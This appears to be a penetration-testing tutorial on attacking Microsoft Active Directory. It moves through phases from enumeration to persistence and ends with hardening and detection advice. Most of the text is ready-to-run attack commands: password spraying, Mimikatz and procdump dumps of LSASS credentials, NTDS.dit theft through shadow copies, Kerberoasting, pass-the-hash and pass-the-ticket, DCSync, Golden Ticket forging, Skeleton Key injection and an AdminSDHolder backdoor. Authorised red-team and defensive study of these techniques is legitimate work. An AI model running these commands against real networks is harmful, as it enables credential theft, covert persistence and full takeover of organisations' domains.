Understanding the Target

Active Directory (AD) is Microsoft's enterprise directory service — the centralised nervous system of virtually every Windows-based corporate network. It manages authentication, authorisation, and Group Policy enforcement across thousands of endpoints simultaneously from a single point of control.

Its pervasiveness is precisely what makes it the most valuable target in any Windows environment. Compromise the Domain Controller and you control the organisation — every user account, every server, every secret stored across the network. Every red team engagement touching a Windows estate will intersect with Active Directory.

[ i ]

Active Directory is deployed in over 90% of Fortune 1000 companies. A successful domain compromise typically results in complete organisational takeover — every user, every server, and every sensitive data store becomes accessible to the attacker.

Core Components

🖥
Domain Controllers
Servers that authenticate users and enforce security policies across the entire domain
👤
Users & Groups
Entities with defined access privileges — primary targets for credential theft and escalation
📂
Organisational Units
Logical containers grouping users and devices for administrative delegation
⚙️
Group Policy Objects
Policy containers that push — and propagate — security configurations at scale

Common Attack Surfaces

Active Directory's architectural complexity and its requirement for backwards compatibility with legacy systems create a wide and persistent attack surface. Decades of design decisions, combined with the reality that most organisations misconfigure their deployments, leave recurring vulnerabilities that adversaries reliably exploit across real-world engagements.

01
Weak Password Policies
Insufficient complexity requirements leave accounts open to brute-force, password spray, and dictionary attacks. Service accounts with static, weak passwords are extremely high-risk targets.
HIGH
02
Unpatched Domain Controllers
Outdated DCs carry publicly known CVEs with working exploits. Examples include ZeroLogon (CVE-2020-1472), PrintNightmare, and EternalBlue — all capable of achieving full domain compromise.
CRITICAL
03
Misconfigured ACLs
Overly permissive Access Control Lists allow low-privileged users to modify high-value objects — including resetting Domain Admin passwords or granting themselves DCSync rights.
CRITICAL
04
Pass-the-Hash / Ticket
NTLM hash reuse and Kerberos ticket theft enable lateral movement without the cleartext credential. A captured hash or ticket is functionally equivalent to the password itself.
CRITICAL
05
Kerberoasting
Service accounts with SPNs expose Kerberos service tickets to offline cracking. Any authenticated domain user can request these tickets — no elevated privilege required.
HIGH
06
Unconstrained Delegation
Servers with unconstrained Kerberos delegation cache TGTs from every authenticating user. Compromising such a server yields impersonation capability over those users — including Domain Admins.
CRITICAL

Phase I — Reconnaissance & Enumeration

Effective AD enumeration means gathering maximum intelligence while generating minimum noise. A skilled operator maps the entire domain — users, groups, trust relationships, SPNs, ACL misconfigurations, and attack paths — before triggering a single security alert. The depth of this phase directly determines the quality of every phase that follows.

[ ⚠ ]

Authorised Environments Only. All techniques and commands in this article are strictly intended for penetration testers operating under explicit, written authorisation from the system owner. Unauthorised access to computer systems is a criminal offence.

Primary Enumeration Toolset

Nmap
Network discovery and DC fingerprinting via LDAP, SMB, Kerberos port scanning and script-based enumeration
BloodHound
Graph-based attack path visualisation — reveals privilege escalation routes invisible to manual analysis
PowerView
PowerShell-native AD enumeration library mapping users, groups, trusts, ACLs, and GPOs from within the domain
CrackMapExec
Mass SMB/LDAP reconnaissance — host enumeration, share listing, and credential validation at scale
ldapsearch
Direct LDAP queries against the domain controller for raw directory enumeration with no extra tooling
SharpHound
BloodHound's C# ingestor — collects domain relationship data quietly for offline graph analysis
# Scan for DC services: LDAP(389/636), Kerberos(88), SMB(445), DNS(53) nmap -p 389,636,88,445,53 \ --script ldap-rootdse,ldap-search,smb-os-discovery \ <TARGET-IP-OR-RANGE>
# Retrieve high-level domain metadata Get-NetDomain # Enumerate all user accounts in the target domain Get-NetUser -Domain example.local # List all domain-joined computers Get-NetComputer # Find all Kerberoastable accounts — no elevated access needed Get-NetUser -SPN | select samaccountname,serviceprincipalname # Identify ACL misconfigurations — GenericAll, WriteDacl, WriteOwner Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl"}
# List accessible shares using null authentication crackmapexec smb <TARGET-IP> -u '' -p '' --shares # Password spray across subnet — always use --continue-on-success to avoid lockouts crackmapexec smb <SUBNET/24> -u users.txt -p 'Password123!' --continue-on-success

Phase II — Credential Harvesting

Once a foothold is established, the priority shifts to credential material. Windows stores authentication data in multiple locations simultaneously — LSASS process memory, the Windows registry, the AD database (NTDS.dit), and Kerberos ticket caches. Each presents a distinct extraction path with different operational requirements and detection risk profiles.

# Dump plaintext passwords, NTLM hashes, and Kerberos keys from LSASS sekurlsa::logonpasswords # Export all Kerberos tickets from memory to .kirbi files sekurlsa::tickets /export # Retrieve locally cached domain credentials (useful when DC is unreachable) lsadump::cache
# Dump the LSASS process to disk for offline parsing — bypasses many AV engines procdump.exe -accepteula -ma lsass.exe lsass.dmp # Parse the dump on your attack machine using pypykatz (Python Mimikatz) pypykatz lsa minidump lsass.dmp
# Create VSS shadow copy to bypass OS file locks on the live NTDS.dit vssadmin create shadow /for=C: # Copy NTDS.dit and the SYSTEM registry hive from shadow copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\exfil\ reg save HKLM\SYSTEM C:\exfil\SYSTEM # Extract all domain hashes offline with Impacket's secretsdump secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL

Phase III — Exploitation & Privilege Escalation

With credential material secured and the attack graph mapped, the operator moves into active exploitation. Each technique below targets a specific architectural weakness in the Kerberos protocol, NTLM authentication, or Active Directory's trust model. Several of these techniques require nothing more than a standard domain user account to initiate.

⟩ Kerberoasting
Any authenticated domain user can request a Kerberos service ticket (TGS) for any account registered with a Service Principal Name (SPN). These tickets are encrypted with the service account's password hash, making them available for unrestricted offline cracking. Service accounts with weak passwords and high privileges — such as those running SQL Server or IIS — are prime candidates.
# Request TGS tickets for all Kerberoastable accounts GetUserSPNs.py example.local/domainuser -request -dc-ip 10.10.10.1 -outputfile hashes.txt # Crack offline with hashcat — Kerberos 5 TGS mode 13100 hashcat -m 13100 hashes.txt wordlist.txt --force
⟩ Pass-the-Hash (PTH)
NTLM authentication does not require a cleartext password — only the password hash. A captured NTLM hash can be used directly to authenticate to any other system where that account exists, enabling lateral movement across the network without cracking a single password. This exploits a fundamental characteristic of the NTLM protocol design.
# Authenticate with NTLM hash — no plaintext password required psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@<TARGET-IP> # Alternative using pth-winexe for an interactive shell pth-winexe -U 'DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>' //<TARGET-IP> cmd.exe
⟩ Pass-the-Ticket (PTT)
Kerberos TGTs extracted from LSASS memory can be injected directly into the current session, granting authentication as the original ticket owner. No password or hash is required — this is pure impersonation via stolen Kerberos state. Particularly powerful when tickets belonging to Domain Admins or privileged service accounts are captured.
# Export all cached Kerberos tickets to .kirbi files mimikatz "sekurlsa::tickets /export" # Inject a captured ticket into the current Windows logon session mimikatz "kerberos::ptt Administrator@example.local.kirbi" # Verify the ticket is loaded klist
⟩ DCSync — Replication Protocol Abuse
By impersonating a domain replication partner, an attacker with replication privileges (GenericAll, WriteDacl, or explicit Replication rights on the domain object) can pull password hashes for any account directly from the DC via the MS-DRSR protocol — including the krbtgt hash — without executing any code on the domain controller itself, making this technique highly stealthy.
# Dump all domain password hashes via replication — no code runs on the DC mimikatz "lsadump::dcsync /domain:example.local /all /csv" # Target the krbtgt account specifically — required for Golden Ticket forging mimikatz "lsadump::dcsync /domain:example.local /user:krbtgt"

Phase IV — Post-Exploitation & Persistence

Reaching Domain Admin is not the end of an engagement — it is a platform. Sophisticated threat actors establish persistence mechanisms that survive password resets, account lockouts, and full DC reboots. These techniques convert temporary access into long-term, covert domain control. Understanding them is essential for both operators conducting assessments and defenders building detection capabilities.

⟩ Golden Ticket Attack
With the krbtgt account hash, an attacker can forge Kerberos TGTs for any user, to any service, with any group membership, and with an arbitrarily long validity period. This forged ticket is accepted by all Kerberos-aware services without any domain controller contact. The only full remediation requires resetting the krbtgt password twice — which disrupts authentication across the entire domain.
# Forge a Golden Ticket — requires krbtgt hash and the domain SID mimikatz "kerberos::golden \ /domain:example.local \ /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \ /krbtgt:<KRBTGT_NTLM_HASH> \ /user:FakeAdmin /groups:512 /ticket:golden.kirbi" # Inject the forged ticket into the current session mimikatz "kerberos::ptt golden.kirbi" # Verify access to domain resources dir \\DC01\C$
⟩ Skeleton Key Attack
A Skeleton Key patches the LSASS process on a domain controller, inserting a universal master password that works for every account simultaneously — without invalidating existing user credentials. All legitimate users continue authenticating normally while the attacker can authenticate as any user using the universal key. This patch persists in memory until the next DC reboot.
# Inject skeleton key into DC LSASS — requires Domain Admin privilege mimikatz "privilege::debug" "misc::skeleton" # Universal password defaults to "mimikatz" — works for any domain account # net use \\DC01\C$ /user:AnyUser mimikatz # In-memory only — clears on DC reboot
⟩ AdminSDHolder ACL Backdoor
The AdminSDHolder object is the ACL template for all protected AD groups (Domain Admins, Enterprise Admins, etc.). Windows' SDProp process propagates this ACL to all protected group members every 60 minutes. Modifying AdminSDHolder to grant an attacker-controlled account full control creates a self-healing backdoor — one that re-applies itself automatically, surviving manual remediation attempts.
# Grant attacker-controlled account full control over AdminSDHolder Add-ObjectAcl -TargetSearchBase "CN=AdminSDHolder,CN=System,DC=example,DC=local" \ -PrincipalIdentity backdoor_user -Rights All # SDProp propagates automatically every 60 minutes # Force immediate propagation: Invoke-SDPropagator -showProgress -timeoutMinutes 1

Defence — Hardening & Detection

Understanding offensive techniques is inseparable from building effective defences. Every attack method documented above has corresponding detection signals, preventive controls, and architectural mitigations. A mature AD security posture layers these controls — treating a breach as an eventual certainty rather than a remote possibility, and investing equally in prevention and detection.

Credential Security
  • Enforce fine-grained password policies — minimum 15+ characters with complexity for privileged accounts
  • Mandate Multi-Factor Authentication for all admin access and remote logins
  • Use Group Managed Service Accounts (gMSA) — eliminates static service account passwords entirely
  • Enable Protected Users Security Group for Tier-0 accounts — blocks NTLM auth and credential caching
Patch & Harden
  • Maintain priority patching cadence for domain controllers — Critical CVEs within 48 hours
  • Implement Tiered Administration — Domain Admin credentials must never touch workstations
  • Audit and eliminate unconstrained Kerberos delegation — migrate to resource-based constrained delegation
  • Disable legacy protocols: NTLMv1, LLMNR, NetBIOS-NS, and SMBv1 — all exploitable for credential theft
Detection
  • Deploy a SIEM with AD-specific correlation rules — anomalous logon patterns, off-hours activity
  • Enable Advanced Audit Policy — account logon, privilege use, directory service access, object modification
  • Plant Honey Accounts (canary credentials) — any authentication triggers an immediate high-fidelity alert
  • Deploy Microsoft Defender for Identity for native DCSync, lateral movement, and Golden Ticket detection
